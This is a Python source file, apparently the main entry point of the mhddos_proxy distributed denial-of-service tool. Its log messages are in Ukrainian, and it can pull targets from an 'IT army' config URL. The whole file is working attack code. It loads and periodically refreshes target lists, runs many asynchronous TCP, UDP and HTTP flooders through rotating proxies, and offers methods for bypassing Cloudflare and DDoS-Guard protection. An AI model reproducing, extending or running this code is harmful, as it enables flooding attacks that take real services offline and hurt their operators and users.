import asyncio
from contextlib import suppress

# @formatter:off
import colorama; colorama.init()
# @formatter:on
from itertools import cycle
from queue import SimpleQueue
import random
import time
from threading import Event, Thread
from typing import Any, Generator, Iterator, List

from src.cli import init_argparse
from src.concurrency import DaemonThreadPool
from src.core import (
    logger, cl, LOW_RPC, IT_ARMY_CONFIG_URL, WORK_STEALING_DISABLED,
    DNS_WORKERS, Params, Stats, PADDING_THREADS
)
from src.dns_utils import resolve_all_targets
from src.mhddos import main as mhddos_main, async_main as mhddos_async_main
from src.output import show_statistic, print_banner, print_progress
from src.proxies import update_proxies, wrap_async
from src.system import fix_ulimits, is_latest_version
from src.targets import TargetsLoader


# XXX: need a way stop on the signal
# XXX: we need to stick to working targets here the same way we did
#      for wokring stealing algo. otherwise we might be spending too
#      much time cycling over non-working targets. as we all operation
#      one the same thread and we don't really need any sort of sync,
#      we can also do something like prioority queue to reduce priority
#     for dead targets
class AsyncFlooder:

    def __init__(self, switch_after: int = 100):
        self._switch_after = switch_after
        self._runnables = None

    def update_targets(self, runnables: Iterator[Any]):
        self._runnables = runnables

    async def loop(self):
        assert self._runnables is not None
        while True:
            runnable = next(self._runnables)
            with suppress(Exception):
                for _ in range(self._switch_after):
                    await runnable.run()


# XXX: UDP
async def run_async_ddos(
    proxies,
    targets_loader,
    period,
    rpc,
    http_methods,
    vpn_mode,
    debug,
    table,
    total_threads,
    switch_after,
    dns_executor,
):
    statistics, event = {}, Event()
    proxies_cnt = len(proxies)

    def register_params(params, container):
        thread_statistics = Stats()
        statistics[params] = thread_statistics
        kwargs = {
            'url': params.target.url,
            'ip': params.target.addr,
            'method': params.method,
            'rpc': int(params.target.option("rpc", "0")) or rpc,
            'event': event,
            'stats': thread_statistics,
            'proxies': proxies,
        }
        container.append(kwargs)
        if not (table or debug):
            logger.info(
                f'{cl.YELLOW}Атакуємо ціль:{cl.BLUE} %s,{cl.YELLOW} Порт:{cl.BLUE} %s,{cl.YELLOW} Метод:{cl.BLUE} %s{cl.RESET}'
                % (params.target.url.host, params.target.url.port, params.method)
            )

    async def stats_printer():
        refresh_rate = 5
        ts = time.time()
        while True:
            await asyncio.sleep(refresh_rate)
            passed = time.time() - ts
            ts = time.time()
            show_statistic(statistics, refresh_rate, table, vpn_mode, proxies_cnt, period, passed)
    
    logger.info(f'{cl.GREEN}Запускаємо атаку...{cl.RESET}')
    if not (table or debug):
        # Keep the docs/info on-screen for some time before outputting the logger.info above
        await asyncio.sleep(5)

    flooders = [AsyncFlooder(switch_after) for _ in range(total_threads)]

    # XXX: might throw an exception
    async def load_targets():
        targets = await targets_loader.load()
        # XXX: use async DNS resolver or offload properly
        targets = resolve_all_targets(targets, dns_executor)
        return [target for target in targets if target.is_resolved]

    def install_targets(targets):
        kwargs_list, udp_kwargs_list = [], []
        for target in targets:
            assert target.is_resolved, "Unresolved target cannot be used for attack"
            # udp://, method defaults to "UDP"
            if target.is_udp:
                register_params(Params(target, target.method or 'UDP'), udp_kwargs_list)
            # Method is given explicitly
            elif target.method is not None:
                register_params(Params(target, target.method), kwargs_list)
            # tcp://
            elif target.url.scheme == "tcp":
                register_params(Params(target, 'TCP'), kwargs_list)
            # HTTP(S), methods from --http-methods
            elif target.url.scheme in {"http", "https"}:
                for method in http_methods:
                    register_params(Params(target, method), kwargs_list)
            else:
                raise ValueError(f"Unsupported scheme given: {target.url.scheme}")
        runnables_iter = cycle(mhddos_async_main(**kwargs) for kwargs in kwargs_list)
        for flooder in flooders:
            flooder.update_targets(runnables_iter)

    initial_targets = await load_targets()
    if not initial_targets:
        logger.error(f'{cl.RED}Не вказано жодної цілі для атаки{cl.RESET}')
        exit()
    install_targets(initial_targets)

    tasks = [asyncio.ensure_future(f.loop()) for f in flooders]
    tasks.append(asyncio.ensure_future(stats_printer()))

    async def reload_targets(delay_seconds: int = 30):
        while True:
            await asyncio.sleep(delay_seconds)
            targets = await load_targets()
            if targets:
                install_targets(targets)
                logger.info(
                    f"{cl.YELLOW}Оновлення цілей через: {cl.BLUE}{delay_seconds} секунд{cl.RESET}")
            else:
                logger.warning(
                    "{cl.RED}Не знайдено жодної доступної цілі - "
                    f"чекаємо {delay_seconds} сек до наступної перевірки{cl.RESET}")
   
    tasks.append(asyncio.ensure_future(reload_targets(delay_seconds=30)))

    await asyncio.gather(*tasks)


async def start(args):
    print_banner(args.vpn_mode)
    fix_ulimits()

    if args.table:
        args.debug = False

    for bypass in ('CFB', 'DGB'):
        if bypass in args.http_methods:
            logger.warning(
                f'{cl.RED}Робота методу {bypass} не гарантована - атака методами '
                f'за замовчуванням може бути ефективніша{cl.RESET}'
            )

    if args.rpc < LOW_RPC:
        logger.warning(
            f'{cl.YELLOW}RPC менше за {LOW_RPC}. Це може призвести до падіння продуктивності '
            f'через збільшення кількості перепідключень{cl.RESET}'
        )

    is_old_version = not is_latest_version()
    if is_old_version:
        print(
            f'{cl.RED}! ЗАПУЩЕНА НЕ ОСТАННЯ ВЕРСІЯ - ОНОВІТЬСЯ{cl.RESET}: https://telegra.ph/Onovlennya-mhddos-proxy-04-16\n')
    
    # padding threads are necessary to create a "safety buffer" for the
    # system that hit resources limitation when running main pools.
    # it will be deallocated as soon as all other threads are up and running.
    #padding_threads = DaemonThreadPool(PADDING_THREADS).start_all()
    dns_executor = DaemonThreadPool(DNS_WORKERS).start_all()

    if args.itarmy:
        targets_loader = TargetsLoader([], IT_ARMY_CONFIG_URL)
    else:
        targets_loader = TargetsLoader(args.targets, args.config)

    # XXX: periodic updates
    # XXX: fix for UDP targets
    proxies = []
    no_proxies = args.vpn_mode # or all(target.is_udp for target in targets)
    if no_proxies:
        proxies = []
    else:
        proxies = list(update_proxies(args.proxies, proxies))

    proxies = list(wrap_async(proxies))

    period = 300
    # XXX: with the current implementation there's no need to
    # have 2 separate functions to setups params for launching flooders
    await run_async_ddos(
        proxies,
        targets_loader,
        period,
        args.rpc,
        args.http_methods,
        args.vpn_mode,
        args.debug,
        args.table,
        args.threads,
        args.switch_after,
        dns_executor,
    )


# XXX: try uvloop when available
if __name__ == '__main__':
    try:
        asyncio.run(start(init_argparse().parse_args()))
    except KeyboardInterrupt:
        logger.info(f'{cl.BLUE}Завершуємо роботу...{cl.RESET}')
